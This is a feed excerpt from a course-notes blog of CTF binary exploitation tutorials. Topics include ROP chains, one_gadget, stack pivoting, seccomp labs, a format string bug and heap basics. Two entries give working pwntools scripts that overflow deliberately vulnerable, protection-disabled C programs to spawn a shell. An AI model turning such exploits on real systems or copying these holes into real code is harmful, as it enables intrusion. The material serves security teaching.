&lt;img src="https://imgur.com/YGarADK.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-c!=1" data-lang="c!=1">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

int main()
{
 setvbuf(stdin, 0, _IONBF, 0)
 setvbuf(stdout, 0, _IONBF, 0);

 char s[0x10];

 printf(&amp;#34;Here is your \&amp;#34;/bin/sh\&amp;#34;: %p\n&amp;#34;, &amp;#34;/bin/sh&amp;#34;);
 printf(&amp;#34;Give me your ROP: &amp;#34;);
 read(0, s, 0x400);
 
 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>At line &lt;code>11&lt;/code>, &lt;code>%p&lt;/code> means pointer of &lt;code>/bin/sh&lt;/code> string.&lt;/li>
&lt;li>Note that, if you establish the code yourself, you must turn off the protection by the command below and use &lt;code>checksec&lt;/code> to observe the protection. In addition, please use &lt;code>-static&lt;/code> command to compile library at compile time, so that we can get &lt;code>ROP gadget&lt;/code> more easily.
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">gcc -o rop rop.c -zexecstack -no-pie -fno-stack-protector -z norelro -static
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>First, we can observe the program has overflow(very important), but has no other backdoor method can access or global variable can write shellcode. Then we can consider to use &lt;code>ROP gadget&lt;/code> to construct chain.&lt;/li>
&lt;li>Second, we use &lt;code>ROPgadget&lt;/code> to find suitable gadget
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ ROPgadget --multibr --binary rop &amp;gt; rop_gadget
$ vim rop_gadget
&lt;/code>&lt;/pre>&lt;img src="https://imgur.com/IzeTvgK.png" alt="" />
&lt;img src="https://imgur.com/PlA5C8B.png" alt="" />
&lt;img src="https://imgur.com/zg28Pti.png" alt="" />
&lt;img src="https://imgur.com/WDS0HUh.png" alt="" />
&lt;img src="https://imgur.com/dEh7b5n.png" alt="reference link" />
&lt;ul>
&lt;li>Note that, you may consider that &lt;code>pop rdx ; pop rbx ; ret&lt;/code> is not what we want. We just want &lt;code>pop rdx ; ret&lt;/code>. Therefore, we have to push one more value for &lt;code>pop rbx ;&lt;/code> instruction.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Then, we can construct our payload:
&lt;pre tabindex="0">&lt;code class="language-python!=" data-lang="python!=">from pwn import *

context.arch = &amp;#39;amd64&amp;#39;

r = process(&amp;#39;./rop&amp;#39;)

r.recvuntil(&amp;#39;Here is your &amp;#34;/bin/sh&amp;#34;: &amp;#39;)
binsh = int(r.recvline()[:-1], 16)
info(f&amp;#34;binsh: {hex(binsh)}&amp;#34;)

pop_rdi_ret = 0x401eaf
pop_rsi_ret = 0x409ede
pop_rdx_ret = 0x485aeb
pop_rax_ret = 0x44fcc7
syscall = 0x401c64
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Note that, &lt;code>r.recvline()[:-1]&lt;/code> is &lt;code>b'0x498004'&lt;/code> and we must pop to &lt;code>%rdi&lt;/code> at line &lt;code>17&lt;/code> below.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Then we can combine them together using &lt;a href="https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.flat">flat method&lt;/a>. It&amp;rsquo;ll flat the address with &lt;strong>length 8 bytes&lt;/strong>.
&lt;pre tabindex="0">&lt;code class="language-python!=16" data-lang="python!=16">ROP = flat(
 pop_rdi_ret, binsh,
 pop_rsi_ret, 0,
 pop_rdx_ret, 0, 0,
 pop_rax_ret, 0x3b,
 syscall,
)

gdb.attach(r)
r.sendafter(&amp;#34;Give me your ROP: &amp;#34;, b&amp;#39;a&amp;#39; * 0x18 + ROP)

r.interactive()
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Finally, we got shell!!!
&lt;img src="https://imgur.com/dk0Z2mw.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="analysis">
 Analysis
 &lt;a class="anchor" href="#analysis">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>This is totally the same as our hypothesis.
&lt;img src="https://imgur.com/OjcDNbu.png" alt="" />&lt;/li>
&lt;li>We can see that all parameters are ready
&lt;img src="https://imgur.com/xXx7HRQ.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/iA4Hrr17ooI?t=1239">NTUSTISC - Pwn Basic 3 [2019.03.26]&lt;/a>
&lt;a href="https://youtu.be/ktoVQB99Gj4?t=6712">Pwn week1&lt;/a>&lt;/p></description></item><item><title>Simple PWN - 0x08(one_gadget with ROP)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x08one_gadget-with-rop/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x08one_gadget-with-rop/</guid><description>&lt;h1 id="simple-pwn---0x08one_gadget-with-rop">
 Simple PWN - 0x08(one_gadget with ROP)
 &lt;a class="anchor" href="#simple-pwn---0x08one_gadget-with-rop">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="one_gadget-background">
 one_gadget background
 &lt;a class="anchor" href="#one_gadget-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10226977">Day25: [Misc] 我從來沒想過我會害怕寫 code&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>原理是在 &lt;code>glibc&lt;/code> 裡面有很多會透過 &lt;code>execve&lt;/code> 執行 &lt;code>/bin/sh&lt;/code>、再調用外部系統指令的 assembly，當 explolit 已經得知 &lt;code>libc&lt;/code> 的位之後而且可以控制 RIP 之後，就可以直接跳該位置達成 shell out，不需要再辛苦堆 stack 上的參數&lt;/p>&lt;/blockquote>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IOBNF, 0);

 char s[0x10];

 printf(&amp;#34;Your libc: %p&amp;#34;, printf);
 read(0, s, 0x100);

 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>The program has buffer overflow, however it has no backdoor method can access and has no global variable can write shellcode. Thus, we can consider to use &lt;code>ROP&lt;/code> to get shell.&lt;/li>
&lt;li>Note that, it must be a dynamic library, so DO NOT use &lt;code>-static&lt;/code> to compile it.
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">gcc -o one_gadget_with_rop one_gadget_with_rop.c -no-pie -fno-stack-protector -z norelro -zexecstack
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>First, we use &lt;a href="https://shengyu7697.github.io/linux-ldd/">&lt;font color="FF0000">&lt;code>ldd&lt;/code>&lt;/font>&lt;/a> command to find what library the program will use.
&lt;img src="https://imgur.com/ycRb8Tv.png" alt="" />&lt;/li>
&lt;li>In addition, we use &lt;code>one_gadget&lt;/code> command to find &lt;code>execvs&lt;/code>
&lt;ul>
&lt;li>Note that, how to use it can refer to &lt;a href="https://blog.csdn.net/weixin_43092232/article/details/105085880">one_gadget用法&lt;/a>&lt;/li>
&lt;li>We use &lt;code>0xebcf8 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)&lt;/code> as our method
&lt;img src="https://imgur.com/Y7BBH5J.png" alt="" />
&lt;ul>
&lt;li>&lt;font color="FF0000">Note:&lt;/font> it has 3 constraint so that we can get the shell&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">address rbp-0x78 is writable
[rsi] == NULL || rsi == NULL
[rdx] == NULL || rdx == NULL
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Then, we use &lt;code>one_gadget&lt;/code> command to get &lt;code>ROP&lt;/code> chain
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">ROPgadget --binary one_gadget_with_rop --only &amp;#34;pop|ret&amp;#34; &amp;gt; one_gadget
vim one_gadget
&lt;/code>&lt;/pre>You can see that because we didn&amp;rsquo;t compile with library, the gadget that we may can use is very few.
&lt;img src="https://imgur.com/DuGINHL.png" alt="" />
The solution is using the gadget that &lt;code>libc&lt;/code> have:
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &amp;#34;pop|ret&amp;#34; &amp;gt; one_gadget
$ vim one_gadget
&lt;/code>&lt;/pre>We must satisfied one_gadget constraint. &lt;code>0x90529&lt;/code> and &lt;code>0x2be51&lt;/code> are the offset of &lt;code>/lib/x86_64-linux-gnu/libc.so.6&lt;/code>. Therefore, if we want to call these gadget, &lt;font color="FF0000">we must find out the real base address of &lt;code>/lib/x86_64-linux-gnu/libc.so.6&lt;/code>&lt;/font>.
&lt;img src="https://imgur.com/3h5PqcO.png" alt="" />
&lt;img src="https://imgur.com/Z2bBbhJ.png" alt="" />&lt;/li>
&lt;li>Because, &lt;code>ASLR&lt;/code> is turn on in default, so the address of library will be random, we just know the offset of library. In original code, it told us the &lt;code>printf&lt;/code> address in &lt;code>/lib/x86_64-linux-gnu/libc.so.6&lt;/code> → &lt;font color="FF0000">&lt;code>0x7ffff7def770&lt;/code>&lt;/font>
&lt;img src="https://imgur.com/nuYGx24.png" alt="" />
Used &lt;code>gdb&lt;/code> can find the current address of library → &lt;font color="FF0000">&lt;code>0x7ffff7d8f000&lt;/code>&lt;/font>
&lt;img src="https://imgur.com/Et3r2hI.png" alt="" />
Then we can know the offset and construct apart of payload as below
$$0x7ffff7def770 - 0x7ffff7d8f000 = 0x60770$$
&lt;pre tabindex="0">&lt;code class="language-python!=" data-lang="python!=">from pwn import *
import sys

context.arch = &amp;#39;amd64&amp;#39;

r = process(&amp;#39;./one_gadget_with_rop&amp;#39;)

r.recvuntil(&amp;#34;Your libc: &amp;#34;)
libc = int(r.recv(14), 16) - 0x60770
info(f&amp;#34;libc: {hex(libc)}&amp;#34;)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>And prepare our gadget:
&lt;pre tabindex="0">&lt;code class="language-python!=11" data-lang="python!=11">pop_rdx_rbx_ret = libc + 0x90529
pop_rsi_ret = libc + 0x2be51
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Construct whole payload with considering the constraint:
&lt;pre tabindex="0">&lt;code class="language-python!=13" data-lang="python!=13">r.send(b&amp;#39;a&amp;#39;*0x10 + p64(0x404000) + p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0) + p64(libc+0xebcf8))
r.interactivae()
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>b'a'*0x10&lt;/code> is for &lt;code>$rsi&lt;/code>&lt;/li>
&lt;li>&lt;code>p64(0x404000)&lt;/code> is an arbitrary writable and readable address for &lt;code>$rbp-0x78&lt;/code> one of the constraint of one_gadget&lt;/li>
&lt;li>&lt;code>p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0)&lt;/code> is what we did in &lt;a href="https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/rki3GF0cs">last lecture&lt;/a> of &lt;code>ROP&lt;/code>&lt;/li>
&lt;li>&lt;code>p64(libc+0xebcf8)&lt;/code> is the one_gadget that we choose at the beginning.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Finally, we got shell!!!
&lt;img src="https://imgur.com/iIETaBy.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://shengyu7697.github.io/linux-ldd/">Linux ldd 查看執行檔執行時需要哪些 library&lt;/a>
&lt;a href="https://youtu.be/ktoVQB99Gj4">Pwn week1&lt;/a>&lt;/p></description></item><item><title>Simple PWN - 0x09(stack pivoting)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x09stack-pivoting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x09stack-pivoting/</guid><description>&lt;h1 id="simple-pwn---0x09stack-pivoting">
 Simple PWN - 0x09(stack pivoting)
 &lt;a class="anchor" href="#simple-pwn---0x09stack-pivoting">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="stack-pivoting-background">
 Stack Pivoting background
 &lt;a class="anchor" href="#stack-pivoting-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/iA4Hrr17ooI?t=6865">NTUSTISC - Pwn Basic 3 [2019.03.26]&lt;/a>
&lt;a href="https://youtu.be/ktoVQB99Gj4?t=7898">Pwn week1&lt;/a>
It was used when stack overflow bytes not big enough to access a shellcode but it has another lots of writable space can be accessed.
More detailed info. can refer to &lt;a href="https://youtu.be/5D7tvxpSUUM?t=9543">Binary Exploitation (Pwn)&lt;/a>&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

char name[0x80]

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IONBF, 0);

 char s[0x10];

 printf(&amp;#34;Give me your name: &amp;#34;);
 read(0, name, 0x80);

 printf(&amp;#34;Give me your ROP: &amp;#34;);
 read(0, s, 0x20);

 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>You can observe that it has not much stack buffer overflow can use, but it has global variable &lt;code>name&lt;/code> with space &lt;code>0x80&lt;/code>(can be another stack)
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">gcc -o stack_pivoting stack_pivoting.c -no-pie -fno-stack-protector -z norelro -zexecstack -static
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>&lt;font color="FF0000">Note that&lt;/font>:
must use &lt;code>mprotect&lt;/code> to change permission of global variable &lt;code>name&lt;/code> just like &lt;a href="https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/HJhgXGKci">lecture 0x04&lt;/a>, add these line in original code
&lt;pre tabindex="0">&lt;code class="language-c!" data-lang="c!">#include &amp;lt;sys/mman.h&amp;gt;
mprotect(0x403000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC);
&lt;/code>&lt;/pre>&lt;strong>Before &lt;code>mprotect&lt;/code> - &lt;code>vmmap&lt;/code>&lt;/strong>
&lt;img src="https://imgur.com/z8cK5SM.png" alt="" />
&lt;img src="https://imgur.com/J6qKJ8N.png" alt="" />
&lt;strong>After &lt;code>mprotect&lt;/code> - &lt;code>vmmap&lt;/code>&lt;/strong>
&lt;img src="https://imgur.com/gNr8Fya.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Construct &lt;code>ROP&lt;/code> chain&lt;/p></description></item><item><title>Simple PWN - 0x10(`seccomp`/Lab - `rop2win`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x10seccomp_lab---rop2win/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x10seccomp_lab---rop2win/</guid><description>&lt;h1 id="simple-pwn---0x10seccomplab---rop2win">
 Simple PWN - 0x10(&lt;code>seccomp&lt;/code>/Lab - &lt;code>rop2win&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn---0x10seccomplab---rop2win">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>challenge: &lt;code>nc edu-ctf.zoolab.org 10005&lt;/code>&lt;/p>
&lt;h2 id="seccomp-background">
 &lt;code>seccomp&lt;/code> background
 &lt;a class="anchor" href="#seccomp-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/ktoVQB99Gj4?t=8457">Pwn week1&lt;/a>&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;seccomp.h&amp;gt;

char fn[0x20];
char ROP[0x100];


// fd = open(&amp;#34;flag&amp;#34;, 0);
// read(fd, buf, 0x30);
// write(1, buf, 0x30); // 1 --&amp;gt; stdout

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IONBF, 0);

 scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
 seccomp_load(ctx);
 seccomp_release(ctx);

 printf(&amp;#34;Give me filename: &amp;#34;);
 read(0, fn, 0x20);

 printf(&amp;#34;Give me ROP: &amp;#34;);
 read(0, ROP, 0x100);

 char overflow[0x10];
 printf(&amp;#34;Give me overflow: &amp;#34;);
 read(0, overflow, 0x30);

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN - 0x11(format string bug)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x11format-string-bug/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x11format-string-bug/</guid><description>&lt;h1 id="simple-pwn---0x11format-string-bug">
 Simple PWN - 0x11(format string bug)
 &lt;a class="anchor" href="#simple-pwn---0x11format-string-bug">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="format-string-bug-background">
 format string bug background
 &lt;a class="anchor" href="#format-string-bug-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.geeksforgeeks.org/g-fact-31/">printf %n&lt;/a>
&lt;img src="https://media.geeksforgeeks.org/wp-content/cdn-uploads/20191009172738/n-in-printf.jpg" alt="" />&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IONBF, 0);

 char fmt[0x20];

 system(&amp;#34;echo &amp;#39;Give me fmt: &amp;#39;&amp;#34;);
 read(0, fmt, 0x20);
 printf(fmt);

 system(&amp;#34;echo &amp;#39;Give me string: &amp;#39;&amp;#34;);
 read(0, fmt, 0x20);
 puts(fmt);

 return 0;
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ gcc -o fmt fmt.c -no-pie -fno-stack-protector -z norelro -zexecstack
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>In this problem, we can consider to use &lt;code>format string bug&lt;/code> to achieve &lt;code>GOT hijacking&lt;/code> without buffer overflow.&lt;/li>
&lt;li>&lt;strong>The main idea is totally the same as &lt;a href="https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/S1BBpSR5s">GOT hijacking lecture&lt;/a>&lt;/strong>&lt;/li>
&lt;li>Thus, we can observe which function can be overlapped by &lt;code>system plt&lt;/code> → &lt;font color="FF0000">&lt;strong>&lt;code>puts function&lt;/code>&lt;/strong>&lt;/font>
&lt;ul>
&lt;li>Because&amp;hellip;
&lt;code>puts&lt;/code> just needs one argument like &lt;code>system&lt;/code> function, but how about &lt;code>printf&lt;/code>?
Unfortunately, it appeared before 2nd read function, because 2nd &lt;code>read&lt;/code> needs to store the argument for &lt;code>system&lt;/code> function such as &lt;code>sh\x00&lt;/code>.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="exploit---got-hijacking--format-string-bug">
 Exploit - GOT hijacking + format string bug
 &lt;a class="anchor" href="#exploit---got-hijacking--format-string-bug">#&lt;/a>
&lt;/h2>
&lt;p>&lt;strong>Our goal is hijack &lt;code>puts GOT&lt;/code> to &lt;code>system plt&lt;/code>&lt;/strong>&lt;/p></description></item><item><title>Simple PWN - 0x12(Lab - `rop++`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x12lab---rop++/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x12lab---rop++/</guid><description>&lt;h1 id="simple-pwn---0x12lab---rop">
 Simple PWN - 0x12(Lab - &lt;code>rop++&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn---0x12lab---rop">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>challenge: &lt;code>nc edu-ctf.zoolab.org 10004&lt;/code>&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main()
{
 char buf[0x10];
 const char *msg = &amp;#34;show me rop\n&amp;gt; &amp;#34;;

 write(1, msg, strlen(msg));
 read(0, buf, 0x200);

 return 0;
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-makefile!" data-lang="makefile!">gcc -fno-stack-protector -static -o chal rop++.c
&lt;/code>&lt;/pre>&lt;h2 id="analyze">
 Analyze
 &lt;a class="anchor" href="#analyze">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>Obviously buffer overflow!!!&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Check protector&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ checksec chal
[*] &amp;#39;/home/sbk6401/NTUCS/PWN/Lab/rop++/share/chal&amp;#39;
 Arch: amd64-64-little
 RELRO: Partial RELRO
 Stack: Canary found
 NX: NX enabled
 PIE: No PIE (0x400000)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>Preliminary idea is using &lt;code>ROP&lt;/code> chain and get shell, but the problem is where can I write &lt;code>/bin/sh\x00&lt;/code>? We can use &lt;code>vmmap&lt;/code> to observe where section is writable and readable → &lt;code>0x4c5000~0x4c800&lt;/code>
&lt;img src="https://imgur.com/018Nk8F.png" alt="" />&lt;/p></description></item><item><title>Simple PWN - 0x13(Lab - `how2know`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x13lab---how2know/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x13lab---how2know/</guid><description>&lt;h1 id="simple-pwn---0x13lab---how2know">
 Simple PWN - 0x13(Lab - &lt;code>how2know&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn---0x13lab---how2know">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>challenge: &lt;code>nc edu-ctf.zoolab.org 10002&lt;/code>
Environment Version: 22.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;seccomp.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

static char flag[0x30];

int main()
{
 void *addr;
 int fd;
 scmp_filter_ctx ctx;

 addr = mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
 if ((unsigned long)addr == -1)
 perror(&amp;#34;mmap&amp;#34;), exit(1);
 
 fd = open(&amp;#34;/home/chal/flag&amp;#34;, O_RDONLY);
 if (fd == -1)
 perror(&amp;#34;open&amp;#34;), exit(1);
 read(fd, flag, 0x30);
 close(fd);

 write(1, &amp;#34;talk is cheap, show me the code\n&amp;#34;, 33);
 read(0, addr, 0x1000);

 ctx = seccomp_init(SCMP_ACT_KILL);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
 seccomp_load(ctx);
 seccomp_release(ctx);

 ((void(*)())addr)();

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN - 0x14(Simple HEAP)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x14simple-heap/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x14simple-heap/</guid><description>&lt;h1 id="simple-pwn---0x14simple-heap">
 Simple PWN - 0x14(Simple HEAP)
 &lt;a class="anchor" href="#simple-pwn---0x14simple-heap">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="heap-background">
 HEAP background
 &lt;a class="anchor" href="#heap-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/rMqvL9j0QaM">Advanced Binary Exploitation (Pwn) - Heap Exploitation&lt;/a>
&lt;a href="https://youtu.be/Xppj8lA04qQ">SS111-Pwn2&lt;/a>&lt;/p>
&lt;h2 id="allocate-a-memory">
 Allocate a memory
 &lt;a class="anchor" href="#allocate-a-memory">#&lt;/a>
&lt;/h2>
&lt;h3 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h3>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

int main()
{
 void *ptr;
 ptr = malloc(0x30);
 return 0;
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ sudo gcc -o simple_heap simple_heap.c -no-pie
&lt;/code>&lt;/pre>&lt;h3 id="analyze">
 Analyze
 &lt;a class="anchor" href="#analyze">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>Before executing &lt;code>malloc&lt;/code>, there is no &lt;code>heap&lt;/code> space in memory layout
